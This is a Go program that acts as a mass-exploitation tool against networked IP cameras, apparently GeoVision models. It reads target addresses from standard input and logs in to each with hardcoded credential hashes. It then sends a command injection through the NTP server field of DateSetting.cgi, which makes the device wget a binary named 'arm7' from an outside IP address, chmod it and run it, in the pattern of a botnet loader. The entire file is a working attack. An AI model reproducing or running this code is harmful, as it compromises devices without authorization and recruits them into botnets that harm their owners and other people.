package main

import (
	"bufio"
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"sync"
	"time"
)

func loginAndSendPayload(ipPort string, wg *sync.WaitGroup) {
	defer wg.Done()

	loginURL := fmt.Sprintf("http://%s/ssi.cgi/Login.htm", ipPort)
	payloadURL := fmt.Sprintf("http://%s/DateSetting.cgi", ipPort)

	loginData := "username=&password=&Apply=Apply&umd5=415211C483EE3B2EF3ECC042964B3421&pmd5=BAC7DE4D88D45DA1BEBC1F94D4A483B7&browser=1&is_check_OCX_OK=0"

	client := &http.Client{}
	req, err := http.NewRequest("POST", loginURL, bytes.NewBufferString(loginData))
	if err != nil {
		log.Printf("Error creating request: %v", err)
		return
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := client.Do(req)
	if err != nil {
		log.Printf("Error making login request to %s: %v", ipPort, err)
		return
	}
	defer resp.Body.Close()

	time.Sleep(5 * time.Second)

	payloadData := "dwTimeZone=2&dwGainType=0&szSrvIpAddr=time.windows.com%3B%24%28cd+%2Ftmp%3Bwget+http%3A%2F%2F194.15.36.146%2Farm7%3Bchmod+777+*%3B.%2Farm7+geovision%3B%29&NTP_Update_time_hh=5&NTP_Update_time_mm=10&szDateM=2024%2F08%2F07&szTimeM=14%3A25%3A16&bDateFomat=0&bDateFormatMisc=0&dwIsDelay=1&Montype=0&submit=Apply"

	req, err = http.NewRequest("POST", payloadURL, bytes.NewBufferString(payloadData))
	if err != nil {
		log.Printf("Error creating payload request: %v", err)
		return
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err = client.Do(req)
	if err != nil {
		log.Printf("Error sending payload to %s: %v", ipPort, err)
		return
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Printf("Error reading response from %s: %v", ipPort, err)
		return
	}

	fmt.Printf("Response from %s:\n%s\n", ipPort, string(body))
}

func main() {
	log.SetOutput(ioutil.Discard)
	scanner := bufio.NewScanner(os.Stdin)
	var wg sync.WaitGroup

	for scanner.Scan() {
		wg.Add(1) // Add a new goroutine to the WaitGroup
		go loginAndSendPayload(scanner.Text(), &wg)

		time.Sleep(10 * time.Second) // Consider adjusting this delay as needed
	}
	wg.Wait() // Wait for all goroutines to finish
}
